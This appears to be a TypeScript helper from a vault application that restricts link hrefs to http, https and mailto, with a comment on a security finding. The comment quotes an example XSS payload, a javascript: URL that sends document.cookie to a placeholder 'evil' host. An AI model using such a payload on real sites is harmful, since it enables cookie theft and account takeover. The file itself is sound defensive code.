/**
 * URL protocol allowlist for `<a href={value}>` insertion (A03-1).
 *
 * Personal vault entries store arbitrary URL strings. Even though the
 * owner is the only one who can write to their vault, rendering the
 * value into an `href` without protocol filtering allows a self-XSS
 * payload (`javascript:fetch('//evil/' + document.cookie)`) to fire
 * when the user clicks the link. Share-view enforced this before;
 * the owner-view did not — A03-1 collapses both to this helper.
 *
 * Acceptable protocols: http, https, mailto. Anything else (including
 * relative URLs that fail to parse) returns false so the caller can
 * render the value as plain text instead of an anchor.
 */

const SAFE_PROTOCOLS = new Set(["http:", "https:", "mailto:"]);

export function isSafeHref(url: string): boolean {
  try {
    return SAFE_PROTOCOLS.has(new URL(url).protocol);
  } catch {
    return false;
  }
}
